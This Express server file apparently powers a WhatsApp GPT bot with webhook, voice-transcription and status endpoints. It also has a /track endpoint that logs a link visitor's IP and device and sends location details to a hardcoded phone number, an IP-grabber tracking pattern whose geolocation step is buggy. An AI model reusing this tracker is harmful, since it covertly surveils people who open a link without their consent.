import express from 'express';
import  OpenAI from "openai";
import replyfromgpt from './call_gpt.mjs';
import createuser from './sendmessage.mjs';
import voiceToText  from './classificationofrequiest/voice/voice.mjs';
const app = express();
const port = 8080;

app.use(express.json({ limit: '50mb' }));

app.use(express.urlencoded({ extended: false, limit: '50mb' }));

app.get("/",(req,res)=>{
  res.send("app is running");
})

app.post('/whatsapp', async(req, res) => {
  const from = req.body?.From;
  const body = req.body?.Body;
  const profileName = req.body.ProfileName; // Sender name (if available)
  const waId = req.body.WaId;               // Raw WhatsApp ID

  // ✅ Metadata from headers
  const ip =
    req.headers['x-forwarded-for'] || req.connection.remoteAddress;

  const userAgent = req.headers['user-agent'] || 'Not provided';
  const host = req.headers['host'];
  const contentType = req.headers['content-type'];

  console.log('✅ WhatsApp Message Received');
  console.log('From:', from);
  console.log('Body:', body);
  console.log('Profile Name:', profileName);
  console.log('WhatsApp ID:', waId);
  console.log('--- Metadata ---');
  console.log('IP Address:', ip);
  console.log('User-Agent:', userAgent);
  console.log('Host:', host);
  console.log('Content-Type:', contentType);
  console.log('All Headers:', req.headers);

  res.set('Content-Type', 'text/xml');
  const Nummedia= req.body?.NumMedia || 0;
  if(Nummedia>0 && req.body?.MediaContentType0.startsWith('audio/')){
    const audioUrl = req.body?.MediaUrl0;
  try{
    const voicetotext= await voiceToText(audioUrl);

    console.log(`Received audio message from ${from}: ${audioUrl}`);
    return res.send(`
      <Response>
        <Message>Audio messages received from ${from}.</Message>
        <Transcription>${voicetotext}</Transcription>
      </Response>
    `);
    }catch(error){
        console.log("OpenAI API error:", error.message);
        return await createuser( from,"Sorry, something went wrong while processing the audio message.");
  }
  }

  if (!from || !body) {
      console.log('⚠️ Incoming webhook missing "From" or "Body". Raw body:', req.body.toString());
      return res.sendStatus(400);
    }
  console.log(`Message from ${from}: ${body}`);
  try{
  const responsefromgpt=await replyfromgpt(body);
  console.log(`Response from GPT: ${responsefromgpt}`);
  await createuser( from,responsefromgpt);
     
  }catch(error){
    console.log('Error:', error);
    res.status(500).send(`
      <Response>
        <Message>Sorry, something went wrong. Please try again later.</Message>
      </Response>
    `);
  }

});

app.post('/message-status', (req, res) => {
  const { MessageStatus, To } = req.body;

  // Get sender IP address
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

  // Get User-Agent (if available)
  const userAgent = req.headers['user-agent'];

  // Log details
  console.log(`Message to ${To} status: ${MessageStatus}`);
  console.log(`Sender IP: ${ip}`);
  console.log(`User-Agent: ${userAgent}`);
  console.log('Full headers:', req.headers);

  if (MessageStatus === 'failed' || MessageStatus === 'undelivered') {
    // Add fallback logic here
  }

  res.sendStatus(200);
});


// Express app to capture IP info
app.get('/track', async (req, res) => {
  const uid = req.query.uid || 'unknown-user';

  // Get IP address
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

  // Optional: Get user-agent for device info
  const userAgent = req.headers['user-agent'];
  
  // Log or store the data
  console.log(`📥 IP logged for UID: ${uid}`);
  console.log(`🌐 IP Address: ${ip}`);
  console.log(`📱 User-Agent: ${userAgent}`);

  // Step 1: Get your public IP
const getPublicIP = async () => {
  const res = await fetch('https://api.ipify.org?format=json');
  const data = await res.json();
  return data.ip;
};

// Step 2: Get location from IP
const getGeoLocation = async () => {
  const ip = await getPublicIP();
  const res = await fetch(`https://ipapi.co/${ip}/json/`);
  const geo = await res.json();

  console.log(`🌐 IP: ${ip}`);
  console.log(`📍 City: ${geo.city}`);
  console.log(`📍 Region: ${geo.region}`);
  console.log(`📍 Country: ${geo.country_name}`);
  console.log(`🧭 Lat: ${geo.latitude}, Lon: ${geo.longitude}`);
  console.log(`🔗 Google Maps: https://www.google.com/maps?q=${geo.latitude},${geo.longitude}`);
    await createuser("whatsapp:+8801770887721",ip+`<br> IP: ${ip}
      <br> City: ${geo.city}<br> Region: ${geo.region}<br> Country: ${geo.country_name}<br> Lat: ${geo.latitude}, Lon: ${geo.longitude}<br> Google Maps: <a href="https://www.google.com/maps?q=${geo.latitude},${geo.longitude}" target="_blank">View on Maps</a>`);
};

  getGeoLocation();

  // Save to database or file if needed...

  // Send response
  res.send(`<h2>Thanks! We've logged your device.</h2>`);
});



//not push 
/* app.listen(port,()=>{
  console.log(`Server is running on http://localhost:${port}`);
}) */
export default app;


